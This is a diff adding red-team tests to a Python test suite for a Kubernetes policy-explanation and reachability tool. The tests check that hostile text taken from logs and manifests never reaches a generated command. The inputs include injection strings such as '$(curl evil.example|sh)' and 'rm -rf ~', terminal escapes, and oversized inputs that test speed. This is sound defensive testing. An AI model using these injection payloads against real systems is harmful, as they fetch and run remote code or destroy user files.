@@ -4,6 +4,7 @@ from __future__ import annotations
 
 import copy
 import json
+import re
 from pathlib import Path
 from typing import Any
 
@@ -570,3 +571,75 @@ def test_live_tool_and_cli_read_the_cluster(
         + ["--live"]
     )
     assert rc == 1 and capsys.readouterr().out.startswith("DENIED  shop/deployment/orders-api")
+
+
+# --- red team: text from logs and manifests is hostile ------------------------------------------------------------
+
+
+def _commands(out: dict[str, Any]) -> list[str]:
+    found: list[str] = []
+
+    def walk(node: Any) -> None:
+        if isinstance(node, dict):
+            if isinstance(node.get("command"), str):
+                found.append(node["command"])
+            for v in node.values():
+                walk(v)
+        elif isinstance(node, list):
+            for v in node:
+                walk(v)
+
+    walk(out)
+    return found
+
+
+def test_hostile_names_never_reach_a_command_line() -> None:
+    hostile = "\n".join(
+        [
+            'User "alice\nrm -rf ~" cannot list resource "pods" in API group "" in the namespace "shop"',
+            'User "x$(curl evil.example|sh)" cannot list resource "pods" in API group "" in the namespace "shop"',
+            "resource Deployment/x;rm -rf ~/web was blocked due to the following policies\np:\n  r: 'msg'",
+            "The deployments \"a\" is invalid: : ValidatingAdmissionPolicy 'p;curl evil|sh' with binding 'b' denied "
+            "request: no",
+            '\x1b]0;owned\x07admission webhook "validation.gatekeeper.sh" denied the request: [ok] \x1b[31mred',
+        ]
+    )
+    out = explain(hostile)
+    for cmd in _commands(out):
+        assert not re.search(r"[\n;`$|&]|rm -rf|curl evil", cmd), cmd
+    assert "\x1b" not in json.dumps(out) and "\\u001b" not in json.dumps(out)
+
+    manifests = (EXAMPLES / "netpol-shop.yaml").read_text().replace("app: frontend", 'app: "x$(curl evil.example|sh)"')
+    reach = check_reachability(Inventory.from_yaml(manifests), "web/frontend", "shop/orders-api", 8080)
+    for cmd in _commands(reach):
+        assert "$(" not in cmd and "evil" not in cmd, cmd
+    with pytest.raises(ValueError, match="bad label"):
+        check_reachability(_shop(), "web:a b;rm=x", "shop/orders-api", 8080)
+
+
+def test_cli_drops_terminal_escapes(capsys: pytest.CaptureFixture[str]) -> None:
+    assert main(["policy", "explain", PSA.replace("web", "web\x1b[2J")]) == 0
+    assert "\x1b" not in capsys.readouterr().out
+
+
+@pytest.mark.parametrize(
+    "text",
+    [
+        "a" * 200_000,
+        "resource Deployment/x/y was blocked due to the following policies " + ("a" * 300 + ":  ") * 650,
+        "kyverno resource Deployment/x/y was blocked due to the following policies\np:\n  r: '" + "a\n" * 100_000,
+        "policyeval.stackrox.io\n" + "\n" * 200_000,
+        'violates PodSecurity "restricted:latest": ' + "a (b), " * 28_000,
+        "exceeded quota: q, requested: " * 6_600,
+        "ValidatingAdmissionPolicy '" + "a" * 200_000,
+        "unable to validate against any security context constraint: [" * 3_200,
+        "x" * 200_000 + " max limit to request ratio",
+        'User "' * 33_000,
+    ],
+)
+def test_explain_stays_fast_on_hostile_input(text: str) -> None:
+    import time
+
+    start = time.perf_counter()
+    explain(text)
+    assert time.perf_counter() - start < 3.0
